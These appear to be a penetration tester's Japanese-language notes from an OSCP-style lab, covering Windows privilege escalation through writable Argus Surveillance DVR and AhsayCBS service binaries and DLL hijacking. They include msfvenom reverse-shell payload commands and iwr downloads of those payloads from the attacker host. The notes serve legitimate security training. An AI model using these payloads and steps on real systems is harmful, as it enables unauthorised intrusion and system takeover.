# Argus Surveillance DVR binary hijack

- WINPEASの結果、DVRWatchdog.exeがサービスとして起動していることを確認
```powershell
  =================================================================================================

    Argus Surveillance DVR Watchdog(PY Software - Argus Surveillance DVR Watchdog)[C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe] - Autoload - No quotes and Space detected
    File Permissions: Users [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\Argus Surveillance DVR (Users [Allow: AllAccess])
    This program monitors and automatically reboots Argus Surveillance DVR if it's locked-up.
   =================================================================================================
```

- また、書き込みが可能なことを確認
```powershell
*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR> icacls DVRWatchdog.exe
DVRWatchdog.exe BUILTIN\Users:(I)(F)
                NT AUTHORITY\SYSTEM:(I)(F)
                BUILTIN\Administrators:(I)(F)
                OSCP\Sandra:(I)(F)
                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

```

- ペイロード作成
```sh
┌──(koshi㉿kali)-[~/Exam/Happy]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f exe-service -o DVRWatchdog.exe
```

- バックアップを移動したうえで、ファイルをダウンロード
```sh

```

- 権限昇格
![[Pasted image 20260222160445.png]]

# Argus surveilance DVR DLL hijacking

- [Argus Surveillance DVR 4.0.0.0 - Privilege Escalation](https://www.exploit-db.com/exploits/45312)

- アプリケーションディレクトリは書き込み可能なので、これが怪しい
- 以下DLLを作成し、APP ディレクトリに配置する
```sh
gsm_codec.dll
```

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f dll -o gsm_codec.dll
```

```sh
*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR> iwr -uri http://192.168.49.104:8888/gsm_codec.dll -OutFile .\gsm_codec.dll
*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR> dir


    Directory: C:\Program Files\Argus Surveillance DVR


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/23/2022   3:16 AM                NetCams Models
-a----          1/5/2008  10:15 PM          81920 ASFcoder.dll
-a----         1/10/2007   1:36 PM          65536 ASFdecoder.dll
-a----         12/7/2008   5:09 PM         450048 AudioCaptureDemon.exe
-a----        10/13/2006   6:54 PM         290304 AudioList.ovl
-a----          3/2/2007   1:28 PM         971552 BtInstaller.exe
-a----        12/18/2008   8:49 PM        1348096 Camera.exe
-a----         11/1/2002  12:11 AM         282624 camfc.dll
-a----         1/25/2006   5:36 PM         191488 CheckCaptureCards.ovl
-a----         7/30/2007   6:34 PM             33 CommonSettings.ini
-a----         1/25/2006   3:55 PM          40960 ConexantScanner.dll
-a----        10/18/2006  10:49 PM         843824 cv100.dll
-a----        10/18/2006  10:49 PM        1011764 cxcore100.dll
-a----         5/18/2006   5:29 PM          65536 decoder.dll
-a----        12/18/2008   8:50 PM         658760 DVR.exe
-a----        12/18/2008   8:49 PM         476672 DVRConvertToAVIMPEG.exe
-a----         12/6/2008  10:19 PM         717824 DVRViewerWindow.exe
-a----        12/18/2008   8:49 PM         726528 DVRWatchdog.exe
-a----         4/12/2006   6:59 PM         604015 DVR_Idle.scr
-a----        12/18/2008   8:50 PM         319488 FaceDetectDemon.exe
-a----        12/18/2008   8:50 PM         805216 FileExport.exe
-a----        12/18/2008   8:49 PM         322560 FTPUploader.exe
-a----         8/18/2008   1:02 PM          90112 G700decoder.dll
-a----          6/8/2008  10:58 PM         266240 GS4000.dll
-a----         2/21/2026  10:19 PM           9216 gsm_codec.dll
-a----         3/16/2005   7:18 PM         861012 haarcascade_frontalface_alt2.xml
-a----         4/19/2007  11:49 PM         626741 highgui100.dll
-a----         7/29/2008  10:25 AM          53248 IP207W.dll
-a----        12/18/2008   8:49 PM         482304 IPCamReceiver.exe
-a----         12/3/2003  12:00 AM          20480 libavi-dd-1.2.1.dll
-a----         12/3/2003  12:00 AM        3420160 libfilefmt-1.1.1.dll
-a----         3/16/2004   3:52 AM         184320 libguide40.dll
-a----         12/3/2003  12:00 AM         708608 libmcl-3.1.2.dll
-a----          3/3/2008   2:37 PM         118784 MOBI70170IPCAM.dll
-a----        12/18/2008   8:49 PM         441856 MP3Coder.exe
-a----        12/18/2008   8:49 PM         465920 Mpeg4Coder.exe
-a----         2/20/2008   1:46 PM         320512 MPEGDecode.dll
-a----         9/12/2005   7:52 PM         287744 NewDialUpConnection.exe
-a----         2/27/1998  12:25 PM           3968 PCIDUMPR.SYS
-a----        10/31/2007   6:12 PM         304128 PY_Uninstal.exe
-a----        12/18/2008   8:49 PM         469504 SearchCameras.exe
-a----         4/12/2007   5:23 PM         418816 Unregister.exe
-a----         2/20/2008   1:46 PM          91648 VEO.dll
-a----         2/24/2022  10:45 AM             58 Viewer.ini
-a----        12/18/2008   8:49 PM         949248 WebServerForAdmin.exe
-a----         8/13/2007   3:51 PM         446464 wmvdmoe.dll
-a----          9/5/2003   3:13 PM          49152 xrlknc.dll
-a----         9/10/2003  10:40 AM          45056 xrlkncd.dll

```

- システムをシャットダウンして再起動
```sh
shutdown /r /t 0
```

```sh

```

# Argus surveilance dvr unquoted P.E -> Program Filesが書き込み不可なので失敗

- [Argus Surveillance DVR 4.0 - Unquoted Service Path](https://www.exploit-db.com/exploits/50261)

- Local Systemで動作している、かつ、サービスは囲まれていない
```powershell
*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
  Where-Object {
    $_.ObjectName -and
    $_.ObjectName -notmatch 'LocalService|NetworkService' -and
    $_.ImagePath -and
    $_.ImagePath -notmatch '^"?C:\\Windows\\'
    # unquoted service path用
    # $_.PathName -notmatch '"'
  } |
  Select PSChildName, ImagePath, ObjectName

PSChildName                   ImagePath                                                                               ObjectName
-----------                   ---------                                                                               ----------
...
ARGUSSURVEILLANCEDVR_WATCHDOG C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe                                 LocalSystem
...
```

```powershell
  =================================================================================================

    Argus Surveillance DVR Watchdog(PY Software - Argus Surveillance DVR Watchdog)[C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe] - Autoload - No quotes and Space detected
    File Permissions: Users [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\Argus Surveillance DVR (Users [Allow: AllAccess])
    This program monitors and automatically reboots Argus Surveillance DVR if it's locked-up.
   =================================================================================================
```

- 


# cbssvcX64.exe の上書き -> sandra になる

- AhsayCBSのサービスが、BUILTIN USERSに(F)アクセスを提供している
```sh
ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                                                     
  [X] Exception: Access denied 
    Ahsay Cloud Backup Suite(Ahsay Cloud Backup Suite)[C:\Program Files\AhsayCBS\bin\cbssvcX64.exe] - Autoload - No quotes and Space detected
    File Permissions: Users [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\AhsayCBS\bin (Users [Allow: AllAccess])
```
```powershell
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> icacls cbssvcX64.exe
cbssvcX64.exe BUILTIN\Users:(I)(F)
              NT AUTHORITY\SYSTEM:(I)(F)
              BUILTIN\Administrators:(I)(F)
              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
*
```

- しかも、Sandra には再起動権限があるため、サービスを上書き、リロードが可能
```powershell
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system  Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> 
```

- ペイロードの用意
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f exe-service -o cbssvcX64.exe
```

- ターゲットでバックアップを取ったうえでファイルの上書き
```powershell
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> mv cbssvcX64.exe ~/cbssvcX64.exe.bkup
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> dir ~


    Directory: C:\Users\Sandra


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         2/21/2022   3:12 PM                3D Objects
d-r---         2/21/2022   3:12 PM                Contacts
d-r---         2/22/2022   9:14 AM                Desktop
d-r---         3/15/2023   3:23 AM                Documents
d-r---         2/21/2022   3:12 PM                Downloads
d-r---         2/21/2022   3:12 PM                Favorites
d-r---         2/21/2022   3:12 PM                Links
d-r---         2/21/2022   3:12 PM                Music
d-r---         2/21/2022   3:20 PM                Pictures
d-r---         2/21/2022   3:12 PM                Saved Games
d-r---         2/21/2022   3:20 PM                Searches
d-r---         2/21/2022   3:12 PM                Videos
-a----          4/2/2019  11:24 AM         283720 cbssvcX64.exe.bkup
-a----         2/21/2026   9:45 PM           5463 Watch-Command.ps1
-a----         2/21/2026   9:37 PM       10170880 winPEASx64.exe


*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> dir


    Directory: C:\Program Files\AhsayCBS\bin


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/23/2022  10:47 AM                WinX64
d-----         2/23/2022  10:47 AM                WinX86
-a----         1/25/2019  11:21 AM            276 browse.bat
-a----          4/2/2019  11:24 AM          30224 CBSServiceController.exe
-a----        11/25/2015   2:11 PM            187 CBSServiceController.exe.config
-a----          4/2/2019  11:24 AM         206408 cbssvcX86.exe
-a----          4/2/2019  11:23 AM           1923 MigrateV6.bat
-a----          4/2/2019  11:23 AM           1723 MigrateV7.bat
-a----          4/2/2019  11:23 AM           2269 shutdown.bat
-a----          4/2/2019  11:23 AM           2799 startup.bat


*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> iwr -uri http://192.168.49.104:8888/cbssvcX64.exe -OutFile .\cbssvcX64.exe
 
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> dir


    Directory: C:\Program Files\AhsayCBS\bin


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/23/2022  10:47 AM                WinX64
d-----         2/23/2022  10:47 AM                WinX86
-a----         1/25/2019  11:21 AM            276 browse.bat
-a----          4/2/2019  11:24 AM          30224 CBSServiceController.exe
-a----        11/25/2015   2:11 PM            187 CBSServiceController.exe.config
-a----         2/21/2026   9:55 PM          12288 cbssvcX64.exe
-a----          4/2/2019  11:24 AM         206408 cbssvcX86.exe
-a----          4/2/2019  11:23 AM           1923 MigrateV6.bat
-a----          4/2/2019  11:23 AM           1723 MigrateV7.bat
-a----          4/2/2019  11:23 AM           2269 shutdown.bat
-a----          4/2/2019  11:23 AM           2799 startup.bat


*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> 

```

- サービス再起動
```powershell
net stop ahsaycbs
```

```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'ahsaycbs'}
```